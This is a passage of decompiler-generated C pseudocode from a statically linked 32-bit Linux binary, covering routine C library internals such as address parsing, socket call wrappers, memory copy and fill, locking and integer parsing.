  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



void __regparm2
FUN_08052418(undefined4 param_1_00,undefined4 param_2_00,undefined4 param_1,undefined4 param_2,
            undefined4 param_3)

{
  undefined4 uVar1;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_c = 0;
  local_8 = 0;
  local_4 = 0;
  local_18 = param_1;
  local_14 = param_2;
  local_10 = param_3;
  uVar1 = thunk_FUN_08050fbb(0x66,3,&local_18,0,0,0,0,param_2_00);
  FUN_08050fe0(uVar1);
  return;
}



void FUN_08052470(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



void FUN_080524c4(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



uint FUN_08052518(uint param_1)

{
  return param_1 << 0x18 | param_1 >> 0x18 | param_1 >> 8 & 0xff00 | (param_1 & 0xff00) << 8;
}



ushort FUN_08052544(ushort param_1)

{
  return param_1 << 8 | param_1 >> 8;
}



undefined4 FUN_08052550(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 local_4;
  
  iVar1 = FUN_08052578(param_1,&local_4);
  uVar2 = 0xffffffff;
  if (iVar1 != 0) {
    uVar2 = local_4;
  }
  return uVar2;
}



undefined4 FUN_08052578(char *param_1,int param_2)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  uint auStack_28 [5];
  char *local_14;
  
  uVar2 = 0;
  iVar4 = 0;
  auStack_28[1] = 0;
  auStack_28[2] = 0;
  auStack_28[3] = 0;
  auStack_28[4] = 0;
  while( true ) {
    uVar3 = FUN_08052ce1(param_1,&local_14,0,uVar2);
    if (local_14 == param_1) {
      return 0;
    }
    cVar1 = *local_14;
    if ((cVar1 != '\0') && (cVar1 != '.')) {
      return 0;
    }
    uVar2 = (int)*param_1 - 0x30;
    if (9 < uVar2) {
      return 0;
    }
    auStack_28[iVar4 + 1] = uVar3;
    if (cVar1 == '\0') break;
    iVar4 = iVar4 + 1;
    if (iVar4 == 4) {
      return 0;
    }
    param_1 = local_14 + 1;
  }
  if (iVar4 == 1) {
LAB_0805260b:
    auStack_28[3] = auStack_28[2] & 0xffff;
    auStack_28[2] = auStack_28[2] >> 0x10;
  }
  else if (iVar4 != 2) {
    if (iVar4 != 0) goto LAB_0805262f;
    auStack_28[2] = auStack_28[1] & 0xffffff;
    auStack_28[1] = auStack_28[1] >> 0x18;
    goto LAB_0805260b;
  }
  auStack_28[4] = auStack_28[3] & 0xff;
  auStack_28[3] = auStack_28[3] >> 8;
LAB_0805262f:
  iVar4 = 1;
  do {
    if (0xff < auStack_28[iVar4]) {
      return 0;
    }
    *(char *)(iVar4 + -1 + param_2) = (char)auStack_28[iVar4];
    iVar4 = iVar4 + 1;
  } while (iVar4 != 5);
  return 1;
}



void FUN_08052664(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



uint FUN_080526b8(uint param_1)

{
  return param_1 << 0x18 | param_1 >> 0x18 | param_1 >> 8 & 0xff00 | (param_1 & 0xff00) << 8;
}



ushort FUN_080526e4(ushort param_1)

{
  return param_1 << 8 | param_1 >> 8;
}



void FUN_080526f0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_08052710(param_1,param_2,param_3,param_4,0,0);
  return;
}



void __regparm2
FUN_08052710(undefined4 param_1_00,undefined4 param_2_00,undefined4 param_1,undefined4 param_2,
            undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6)

{
  undefined4 uVar1;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_18 = param_1;
  local_14 = param_2;
  local_10 = param_3;
  local_c = param_4;
  local_8 = param_5;
  local_4 = param_6;
  uVar1 = thunk_FUN_08050fbb(0x66,0xc,&local_18,0,0,0,0,param_2_00);
  FUN_08050fe0(uVar1);
  return;
}



void FUN_08052768(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_08052788(param_1,param_2,param_3,param_4,0,0);
  return;
}



void __regparm2
FUN_08052788(undefined4 param_1_00,undefined4 param_2_00,undefined4 param_1,undefined4 param_2,
            undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6)

{
  undefined4 uVar1;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_18 = param_1;
  local_14 = param_2;
  local_10 = param_3;
  local_c = param_4;
  local_8 = param_5;
  local_4 = param_6;
  uVar1 = thunk_FUN_08050fbb(0x66,0xb,&local_18,0,0,0,0,param_2_00);
  FUN_08050fe0(uVar1);
  return;
}



void FUN_080527e0(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



int FUN_08052834(undefined4 param_1,uint param_2)

{
  undefined4 uVar1;
  int iVar2;
  int *piVar3;
  int extraout_EDX;
  int extraout_EDX_00;
  
  uVar1 = FUN_08050f70();
  iVar2 = FUN_08050fe0(uVar1);
  if ((iVar2 < 0) &&
     (((piVar3 = (int *)FUN_08050d40(), *piVar3 == 0x16 ||
       (piVar3 = (int *)FUN_08050d40(), *piVar3 == 0x5d)) && ((param_2 & 0x80800) != 0)))) {
    uVar1 = FUN_08050f70();
    iVar2 = FUN_08050fe0(uVar1);
    if (-1 < iVar2) {
      if ((param_2 & 0x80000) != 0) {
        FUN_08050f70();
        iVar2 = extraout_EDX;
      }
      if ((param_2 & 0x800) != 0) {
        FUN_08050f70();
        iVar2 = extraout_EDX_00;
      }
    }
  }
  return iVar2;
}



void FUN_08052954(void)

{
  return;
}



int FUN_08052955(void)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  undefined8 uVar4;
  undefined local_88 [128];
  
  FUN_08052954(0xffffffff);
  FUN_08052a2f(local_88);
  uVar1 = FUN_08050f70();
  iVar2 = FUN_08050fe0(uVar1);
  if (iVar2 == 0) {
    uVar4 = FUN_08050f70();
    iVar3 = (int)((ulonglong)uVar4 >> 0x20);
    *(int *)(iVar3 + 0x1c) = (int)uVar4;
    *(undefined4 *)(iVar3 + 0x90) = 0;
    *(undefined4 *)(iVar3 + 0x8c) = 0;
    DAT_0805588c = 0;
  }
  FUN_08052a4e(local_88);
  FUN_08052954(iVar2 == 0);
  return iVar2;
}



void FUN_080529e0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  thunk_FUN_08050fbb(0x8e,param_1,param_2,param_3,param_4,param_5,0);
  FUN_08050fe0();
  return;
}



void FUN_08052a10(void)

{
  FUN_08050f70();
  return;
}



void FUN_08052a2f(void)

{
  FUN_08050f70();
  return;
}



void FUN_08052a4e(void)

{
  FUN_08050f70();
  return;
}



void FUN_08052a70(void)

{
  FUN_08050f70();
  FUN_08050fe0();
  return;
}



undefined4 FUN_08052a8c(void)

{
  undefined4 uVar1;
  undefined local_88 [128];
  
  FUN_08052a10(local_88);
  FUN_08050f70();
  uVar1 = FUN_08050f70();
  uVar1 = FUN_08050fe0(uVar1);
  FUN_08052a4e(local_88);
  return uVar1;
}



undefined8 FUN_08052ae4(int param_1,int param_2)

{
  uint uVar1;
  uint *puVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  undefined4 uStack_c;
  
  uVar1 = param_2 - 1;
  if ((uVar1 < 0x40) && (2 < param_2 - 0x20U)) {
    puVar2 = (uint *)(param_1 + (uVar1 >> 5) * 4);
    *puVar2 = *puVar2 | 1 << ((byte)uVar1 & 0x1f);
    uVar4 = 0;
  }
  else {
    puVar3 = (undefined4 *)FUN_08050d40();
    *puVar3 = 0x16;
    uVar4 = 0xffffffff;
  }
  return CONCAT44(uStack_c,uVar4);
}



undefined4 FUN_08052b28(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  return 0;
}



undefined4 __regparm1 FUN_08052b3c(undefined4 param_1_00,undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 local_11c [33];
  undefined4 local_98;
  undefined4 local_90 [35];
  
  FUN_08052dbc(local_11c,0,0x8c,param_1_00);
  local_98 = 0x10000000;
  local_11c[0] = param_2;
  iVar1 = FUN_0805423a(param_1,local_11c,local_90);
  uVar2 = 0xffffffff;
  if (-1 < iVar1) {
    uVar2 = local_90[0];
  }
  return uVar2;
}



undefined8 FUN_08052ba0(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  undefined4 uStack_c;
  
  iVar1 = FUN_08052f94(param_1,param_2,param_3);
  if (iVar1 != 0) {
    piVar2 = (int *)FUN_08050d40();
    *piVar2 = iVar1;
    iVar1 = -1;
  }
  return CONCAT44(uStack_c,iVar1);
}



int FUN_08052bd0(char *param_1)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  
  while( true ) {
    cVar1 = *param_1;
    if ((cVar1 != 0x20) && (4 < (int)cVar1 - 9U)) break;
    param_1 = param_1 + 1;
  }
  if (cVar1 == '+') {
    bVar2 = false;
  }
  else {
    bVar2 = false;
    if (cVar1 != '-') goto LAB_08052bfd;
    bVar2 = true;
  }
  param_1 = param_1 + 1;
LAB_08052bfd:
  iVar3 = 0;
  for (; (int)*param_1 - 0x30U < 10; param_1 = param_1 + 1) {
    iVar3 = iVar3 * 10 - ((int)*param_1 - 0x30U);
  }
  if (!bVar2) {
    iVar3 = -iVar3;
  }
  return iVar3;
}



undefined8 __regparm3
FUN_08052c1c(int param_1_00,int *param_2_00,undefined4 param_3,undefined4 param_1,undefined4 param_2
            )

{
  int iVar1;
  undefined8 uVar2;
  undefined4 local_98;
  int local_94;
  int local_90;
  int local_6c;
  undefined4 local_4c;
  int local_24;
  
  if (param_1_00 < 0) {
    local_90 = -1;
    iVar1 = param_1_00;
  }
  else {
    iVar1 = param_1_00 + 0x7fffffff;
    local_90 = iVar1;
  }
  local_4c = 0xffffffff;
  local_98 = 0;
  local_94 = param_1_00;
  local_6c = param_1_00;
  FUN_08053ba0(&local_98,0,0,iVar1);
  uVar2 = FUN_08053410(&local_98,param_3,1,param_1,param_2);
  if (param_2_00 != (int *)0x0) {
    *param_2_00 = param_1_00 + (local_94 - local_90) + local_24;
  }
  return uVar2;
}



void FUN_08052ce1(void)

{
  FUN_08052c1c(0xffffffff,0);
  return;
}



undefined4 * FUN_08052d4c(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  
  puVar1 = param_1;
  if (3 < param_3) {
    uVar2 = (uint)param_1 & 3;
    while (uVar2 != 0) {
      *(undefined *)param_1 = *(undefined *)param_2;
      param_3 = param_3 - 1;
      uVar2 = (uint)(undefined4 *)((int)param_1 + 1) & 3;
      param_1 = (undefined4 *)((int)param_1 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
  }
  for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
    *param_1 = *param_2;
    param_2 = param_2 + 1;
    param_1 = param_1 + 1;
  }
  for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {
    *(undefined *)param_1 = *(undefined *)param_2;
    param_2 = (undefined4 *)((int)param_2 + 1);
    param_1 = (undefined4 *)((int)param_1 + 1);
  }
  return puVar1;
}



undefined4 * FUN_08052d88(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined *puVar3;
  undefined *puVar4;
  
  if (param_3 <= (uint)((int)param_1 - (int)param_2)) {
    puVar1 = param_1;
    if (3 < param_3) {
      uVar2 = (uint)param_1 & 3;
      while (uVar2 != 0) {
        *(undefined *)param_1 = *(undefined *)param_2;
        param_3 = param_3 - 1;
        uVar2 = (uint)(undefined4 *)((int)param_1 + 1) & 3;
        param_1 = (undefined4 *)((int)param_1 + 1);
        param_2 = (undefined4 *)((int)param_2 + 1);
      }
    }
    for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
      *param_1 = *param_2;
      param_2 = param_2 + 1;
      param_1 = param_1 + 1;
    }
    for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined *)param_1 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      param_1 = (undefined4 *)((int)param_1 + 1);
    }
    return puVar1;
  }
  puVar3 = (undefined *)((int)param_2 + (param_3 - 1));
  puVar4 = (undefined *)((int)param_1 + (param_3 - 1));
  for (; param_3 != 0; param_3 = param_3 - 1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + -1;
    puVar4 = puVar4 + -1;
  }
  return (undefined4 *)(puVar4 + 1);
}



int * FUN_08052dbc(int *param_1,byte param_2,uint param_3)

{
  int iVar1;
  undefined2 uVar2;
  undefined4 uVar3;
  int *piVar4;
  
  if (param_3 < 0x3f) {
    if (param_3 != 0) {
      uVar2 = CONCAT11(param_2,param_2);
      *(byte *)param_1 = param_2;
      *(byte *)((int)param_1 + (param_3 - 1)) = param_2;
      if (2 < param_3) {
        *(undefined2 *)((int)param_1 + 1) = uVar2;
        *(undefined2 *)((int)param_1 + (param_3 - 3)) = uVar2;
        if (6 < param_3) {
          uVar3 = CONCAT22(uVar2,CONCAT11(param_2,param_2));
          *(undefined4 *)((int)param_1 + 3) = uVar3;
          *(undefined4 *)((int)param_1 + (param_3 - 7)) = uVar3;
          if (0xe < param_3) {
            *(undefined4 *)((int)param_1 + 7) = uVar3;
            *(undefined4 *)((int)param_1 + 0xb) = uVar3;
            *(undefined4 *)((int)param_1 + (param_3 - 0xf)) = uVar3;
            *(undefined4 *)((int)param_1 + (param_3 - 0xb)) = uVar3;
            if (0x1e < param_3) {
              *(undefined4 *)((int)param_1 + 0xf) = uVar3;
              *(undefined4 *)((int)param_1 + 0x13) = uVar3;
              *(undefined4 *)((int)param_1 + 0x17) = uVar3;
              *(undefined4 *)((int)param_1 + 0x1b) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x1f)) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x1b)) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x17)) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x13)) = uVar3;
            }
          }
        }
      }
    }
    return param_1;
  }
  iVar1 = (uint)param_2 * 0x1010101;
  *(int *)((int)param_1 + (param_3 - 4)) = iVar1;
  piVar4 = param_1;
  if (((uint)param_1 & 0xf) != 0) {
    *param_1 = iVar1;
    param_1[1] = iVar1;
    param_1[2] = iVar1;
    param_1[3] = iVar1;
    param_3 = param_3 - (-(int)param_1 & 0xfU);
    piVar4 = (int *)((int)param_1 + (-(int)param_1 & 0xfU));
  }
  for (param_3 = param_3 >> 2; param_3 != 0; param_3 = param_3 - 1) {
    *piVar4 = iVar1;
    piVar4 = piVar4 + 1;
  }
  return param_1;
}



undefined4 FUN_08052e78(int *param_1)

{
  int iVar1;
  undefined4 local_c;
  
  if (*param_1 != 0) {
    *param_1 = 0;
    LOCK();
    UNLOCK();
    if (param_1[1] != 0) {
      iVar1 = FUN_08050f70();
      if (iVar1 == -0x26) {
        FUN_08050f70();
      }
    }
  }
  return local_c;
}



void FUN_08052ebf(int *param_1)

{
  int iVar1;
  
  if (DAT_0805588c != 0) {
    while( true ) {
      LOCK();
      iVar1 = *param_1;
      *param_1 = 1;
      UNLOCK();
      if (iVar1 == 0) break;
      FUN_08052f00(param_1,param_1 + 1,1,1);
    }
  }
  return;
}



void thunk_FUN_08050fbb(void)

{
  FUN_08050fa1(&stack0x00000018);
  return;
}



void thunk_FUN_08050fbb(void)

{
  FUN_08050fa1(&stack0x00000018);
  return;
}



int FUN_08052f00(int *param_1,int *param_2,int param_3)

{
  int iVar1;
  int local_14;
  
  iVar1 = 100;
  while (iVar1 = iVar1 + -1, iVar1 != -1) {
    if ((param_2 != (int *)0x0) && (*param_2 != 0)) goto LAB_08052f4a;
    if (*param_1 != param_3) {
      return local_14;
    }
  }
  if (param_2 != (int *)0x0) {
LAB_08052f4a:
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
  }
  while (*param_1 == param_3) {
    local_14 = FUN_08050f70();
    if (local_14 == -0x26) {
      FUN_08050f70();
    }
  }
  if (param_2 != (int *)0x0) {
    LOCK();
    *param_2 = *param_2 + -1;
    UNLOCK();
  }
  return local_14;
}



int FUN_08052f94(uint param_1,undefined4 param_2,uint *param_3)

{
  int iVar1;
  
  iVar1 = 0x16;
  if (param_1 < 3) {
    iVar1 = FUN_08050f70();
    iVar1 = -iVar1;
    if ((iVar1 == 0) && (param_3 != (uint *)0x0)) {
      *param_3 = *param_3 & 0x7fffffff;
      param_3[1] = param_3[1] & 0xfffffffc;
    }
  }
  return iVar1;
}



int FUN_08052fd0(void)

{
  int iVar1;
  int local_c;
  int local_8;
  
  iVar1 = FUN_08053024(2,&local_c);
  if ((iVar1 == 0) && (local_c < 0x864)) {
    if (local_8 / 1000 <= local_c * -1000000 + 0x7fffffff) {
      return local_c * 1000000 + local_8 / 1000;
    }
  }
  return -1;
}



void __regparm3 FUN_08053024(undefined4 param_1)

{
  code *pcVar1;
  
  if (DAT_08055550 == (code *)0x0) {
    pcVar1 = (code *)FUN_08053d40("LINUX_2.6","__vdso_clock_gettime",param_1,param_1);
    if (pcVar1 == (code *)0x0) {
      pcVar1 = (code *)&LAB_0805307b;
    }
    LOCK();
    if (DAT_08055550 != (code *)0x0) {
      pcVar1 = DAT_08055550;
    }
    DAT_08055550 = pcVar1;
    UNLOCK();
  }
                    // WARNING: Could not recover jumptable at 0x08053079. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_08055550)();
  return;
}



undefined4 FUN_080530dc(undefined4 *param_1)

{
  undefined4 local_c [2];
  
  FUN_08053024(0,local_c);
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = local_c[0];
  }
  return local_c[0];
}



void FUN_08053108(void)

{
  FUN_08050f70();
  FUN_08050fe0();
  return;
}



undefined4 FUN_08053120(undefined4 param_1)

{
  return param_1;
}



void FUN_08053125(undefined4 param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08053120(param_1);
  thunk_FUN_08050fbb(6,uVar1,0,0,0,0,0);
  FUN_08050fe0();
  return;
}



void FUN_08053160(void)

{
  FUN_08050f70();
  return;
}



void FUN_0805316c(void)

{
  FUN_08050f70();
  return;
}



void FUN_08053178(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  thunk_FUN_08050fbb(3,param_1,param_2,param_3,0,0,0);
  FUN_08050fe0();
  return;
}



void FUN_080531a0(void)

{
  FUN_08050f70();
  FUN_08050fe0();
  return;
}



void FUN_080531c4(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



undefined4 FUN_080531dc(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 local_8;
  undefined4 local_4;
  
  local_4 = 0;
  local_8 = param_1;
  iVar1 = FUN_08054324(&local_8,&local_8);
  uVar2 = 0;
  if (iVar1 != 0) {
    uVar2 = local_8;
  }
  return uVar2;
}



void FUN_08053210(void)

{
  FUN_08050f70();
  FUN_08050fe0();
  return;
}



void FUN_08053228(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  thunk_FUN_08050fbb(4,param_1,param_2,param_3,0,0,0);
  FUN_08050fe0();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_08053250(undefined4 *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 uStack_c;
  
  iVar2 = DAT_080558c4;
  puVar3 = param_1;
  if (DAT_080558b8 != 0) {
    iVar1 = _DAT_08055894 + -0xd4;
    *param_1 = 1;
    puVar3 = (undefined4 *)(~(iVar2 - 1U) & (int)param_1 + iVar1);
    iVar2 = (int)puVar3 - DAT_080558c0;
    puVar3[0x34] = param_1;
    puVar3[1] = param_1;
    param_1[1] = iVar2;
    FUN_08052d4c(iVar2,DAT_080558b8,DAT_080558bc,param_1);
  }
  return CONCAT44(uStack_c,puVar3);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_080532b0(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int *piVar3;
  int *piVar4;
  int iVar5;
  undefined *puVar6;
  undefined4 local_18;
  undefined4 local_14;
  
  piVar3 = (int *)0x0;
  iVar5 = 0;
  piVar4 = *(int **)(param_1 + 0xc);
  for (iVar1 = *(int *)(param_1 + 0x14); iVar1 != 0; iVar1 = iVar1 + -1) {
    if (*piVar4 == 6) {
      iVar5 = (int)*(int **)(param_1 + 0xc) - piVar4[2];
    }
    else if (*piVar4 == 7) {
      piVar3 = piVar4;
    }
    piVar4 = (int *)((int)piVar4 + *(int *)(param_1 + 0x10));
  }
  if (piVar3 != (int *)0x0) {
    DAT_080558bc = piVar3[4];
    DAT_080558b8 = iVar5 + piVar3[2];
    DAT_080558c0 = piVar3[5];
    DAT_080558c4 = piVar3[7];
  }
  DAT_080558c0 = (-DAT_080558b8 - DAT_080558c0 & DAT_080558c4 - 1) + DAT_080558c0;
  if (DAT_080558c4 < 4) {
    DAT_080558c4 = 4;
  }
  puVar6 = &DAT_08055558;
  _DAT_08055894 = DAT_080558c4 + 0xdf + DAT_080558c0 & 0xfffffffc;
  if (0x118 < _DAT_08055894) {
    local_18 = 0xffffffff;
    local_14 = 0;
    puVar6 = (undefined *)FUN_08050fa1(&local_18);
  }
  iVar1 = FUN_08053250(puVar6);
  *(int *)iVar1 = iVar1;
  iVar5 = FUN_080542cc(iVar1);
  if (-1 < iVar5) {
    if (iVar5 == 0) {
      _DAT_08055880 = 1;
    }
    uVar2 = FUN_08050f70();
    *(undefined4 *)(iVar1 + 0x1c) = uVar2;
    *(undefined **)(iVar1 + 0x9c) = &DAT_0805589c;
    *(int *)(iVar1 + 0x88) = iVar1 + 0x88;
    return;
  }
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}



void FUN_080533f4(void)

{
  do {
    FUN_08050f70();
  } while( true );
}



// WARNING: Removing unreachable block (ram,0x08053754)

undefined8 FUN_08053410(int param_1,uint param_2,int param_3,uint param_4,uint param_5)

{
  int iVar1;
  byte bVar2;
  byte *pbVar3;
  undefined4 *puVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  ulonglong uVar12;
  uint local_58;
  uint local_3c;
  uint local_38;
  uint local_20;
  byte local_15;
  
  local_3c = param_4;
  local_38 = param_5;
  if (param_2 < 0x25) {
    do {
      pbVar3 = *(byte **)(param_1 + 4);
      if (pbVar3 < *(byte **)(param_1 + 0x68)) {
        uVar8 = (uint)*pbVar3;
        *(byte **)(param_1 + 4) = pbVar3 + 1;
      }
      else {
        uVar8 = FUN_08053c20(param_1);
      }
    } while ((uVar8 == 0x20) || (uVar8 - 9 < 5));
    if ((uVar8 == 0x2b) || (local_20 = 0, uVar8 == 0x2d)) {
      pbVar3 = *(byte **)(param_1 + 4);
      if (pbVar3 < *(byte **)(param_1 + 0x68)) {
        uVar6 = (uint)*pbVar3;
        *(byte **)(param_1 + 4) = pbVar3 + 1;
      }
      else {
        uVar6 = FUN_08053c20(param_1);
      }
      local_20 = -(uint)(uVar8 == 0x2d);
      if (param_2 != 0) goto LAB_08053497;
LAB_08053560:
      if (uVar6 == 0x30) {
        pbVar3 = *(byte **)(param_1 + 4);
        if (pbVar3 < *(byte **)(param_1 + 0x68)) {
          uVar6 = (uint)*pbVar3;
          *(byte **)(param_1 + 4) = pbVar3 + 1;
        }
        else {
          uVar6 = FUN_08053c20(param_1);
        }
        if ((uVar6 | 0x20) == 0x78) {
          pbVar3 = *(byte **)(param_1 + 4);
          if (pbVar3 < *(byte **)(param_1 + 0x68)) {
            uVar8 = (uint)*pbVar3;
            *(byte **)(param_1 + 4) = pbVar3 + 1;
          }
          else {
            uVar8 = FUN_08053c20(param_1);
          }
          local_15 = (&DAT_08054d41)[uVar8];
          uVar8 = 0xf;
          param_2 = 0x10;
          if (0xf < local_15) {
            if (*(int *)(param_1 + 0x68) != 0) {
              *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + -1;
            }
            if (param_3 == 0) {
              FUN_08053ba0(param_1,0,0);
              local_3c = 0;
              local_38 = 0;
            }
            else {
              local_3c = 0;
              local_38 = 0;
              if (*(int *)(param_1 + 0x68) != 0) {
                *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + -1;
              }
            }
            goto LAB_08053505;
          }
        }
        else {
          if (param_2 != 0) goto LAB_08053590;
          local_15 = (&DAT_08054d41)[uVar6];
          uVar8 = 7;
          param_2 = 8;
        }
        goto LAB_080535b5;
      }
      if (param_2 != 0) goto LAB_080534a5;
      param_2 = 10;
      if ((byte)(&DAT_08054d41)[uVar6] < 10) goto LAB_08053590;
    }
    else {
      uVar6 = uVar8;
      if (param_2 == 0) goto LAB_08053560;
LAB_08053497:
      if (param_2 == 0x10) goto LAB_08053560;
LAB_080534a5:
      if ((byte)(&DAT_08054d41)[uVar6] < param_2) {
LAB_08053590:
        uVar7 = 0;
        if (param_2 == 10) {
          while ((uVar8 = uVar6 - 0x30, uVar8 < 10 && (uVar7 < 0x19999999))) {
            pbVar3 = *(byte **)(param_1 + 4);
            if (pbVar3 < *(byte **)(param_1 + 0x68)) {
              uVar8 = (uint)*pbVar3;
              *(byte **)(param_1 + 4) = pbVar3 + 1;
            }
            else {
              uVar8 = FUN_08053c20(param_1);
            }
            uVar7 = (uVar6 - 0x30) + uVar7 * 10;
            uVar6 = uVar8;
          }
          uVar11 = 0;
          while (uVar8 < 10) {
            if ((0x19999999 < uVar11) || ((0x19999998 < uVar11 && (0x99999999 < uVar7)))) {
LAB_080538e4:
              if ((uVar8 < 10) && ((byte)(&DAT_08054d41)[uVar6] < 10)) {
                local_15 = (&DAT_08054d41)[uVar6];
                goto LAB_080537e4;
              }
              break;
            }
            uVar5 = (uint)((ulonglong)uVar7 * 10);
            uVar10 = (int)((ulonglong)uVar7 * 10 >> 0x20) + uVar11 * 10;
            uVar9 = ~((int)uVar8 >> 0x1f);
            if ((uVar9 <= uVar10) && ((uVar9 < uVar10 || (~uVar8 < uVar5)))) goto LAB_080538e4;
            pbVar3 = *(byte **)(param_1 + 4);
            if (pbVar3 < *(byte **)(param_1 + 0x68)) {
              uVar6 = (uint)*pbVar3;
              *(byte **)(param_1 + 4) = pbVar3 + 1;
            }
            else {
              uVar6 = FUN_08053c20(param_1);
            }
            uVar7 = uVar8 + uVar5;
            uVar11 = ((int)uVar8 >> 0x1f) + uVar10 + (uint)CARRY4(uVar8,uVar5);
            uVar8 = uVar6 - 0x30;
          }
          goto LAB_08053859;
        }
        local_15 = (&DAT_08054d41)[uVar6];
        uVar8 = param_2 - 1;
LAB_080535b5:
        uVar7 = 0;
        if ((param_2 & uVar8) == 0) {
          bVar2 = (&DAT_08054d20)[param_2 * 0x17 >> 5 & 7];
          for (; (uVar8 = (uint)local_15, uVar8 < param_2 && (uVar7 < 0x8000000));
              uVar7 = uVar7 << (bVar2 & 0x1f) | uVar8) {
            pbVar3 = *(byte **)(param_1 + 4);
            if (pbVar3 < *(byte **)(param_1 + 0x68)) {
              uVar6 = (uint)*pbVar3;
              *(byte **)(param_1 + 4) = pbVar3 + 1;
            }
            else {
              uVar6 = FUN_08053c20(param_1);
            }
            local_15 = (&DAT_08054d41)[uVar6];
          }
          uVar11 = 0;
          uVar5 = 0xffffffff >> (bVar2 & 0x1f);
          uVar8 = uVar5;
          uVar6 = 0xffffffffU >> (bVar2 & 0x1f) | -1 << 0x20 - (bVar2 & 0x1f);
          if ((bVar2 & 0x20) != 0) {
            uVar8 = 0;
            uVar6 = uVar5;
          }
          while (local_15 < param_2) {
            if ((uVar8 <= uVar11) && ((uVar8 < uVar11 || (uVar6 < uVar7)))) goto LAB_080537e4;
            pbVar3 = *(byte **)(param_1 + 4);
            if (pbVar3 < *(byte **)(param_1 + 0x68)) {
              uVar5 = (uint)*pbVar3;
              *(byte **)(param_1 + 4) = pbVar3 + 1;
            }
            else {
              uVar5 = FUN_08053c20(param_1);
            }
            uVar9 = uVar7 << (bVar2 & 0x1f);
            uVar10 = uVar9;
            uVar11 = uVar11 << (bVar2 & 0x1f) | uVar7 >> 0x20 - (bVar2 & 0x1f);
            if ((bVar2 & 0x20) != 0) {
              uVar10 = 0;
              uVar11 = uVar9;
            }
            uVar7 = uVar10 | local_15;
            local_15 = (&DAT_08054d41)[uVar5];
          }
        }
        else {
          for (; (uVar8 = (uint)local_15, uVar8 < param_2 && (uVar7 < 0x71c71c7));
              uVar7 = param_2 * uVar7 + uVar8) {
            pbVar3 = *(byte **)(param_1 + 4);
            if (pbVar3 < *(byte **)(param_1 + 0x68)) {
              uVar6 = (uint)*pbVar3;
              *(byte **)(param_1 + 4) = pbVar3 + 1;
            }
            else {
              uVar6 = FUN_08053c20(param_1);
            }
            local_15 = (&DAT_08054d41)[uVar6];
          }
          uVar11 = 0;
          while( true ) {
            uVar8 = (uint)local_15;
            if (param_2 <= uVar8) break;
            uVar12 = FUN_08054510(0xffffffff,0xffffffff,param_2,0);
            if (uVar12 < CONCAT44(uVar11,uVar7)) goto LAB_080537e4;
            uVar6 = (uint)((ulonglong)param_2 * (ulonglong)uVar7);
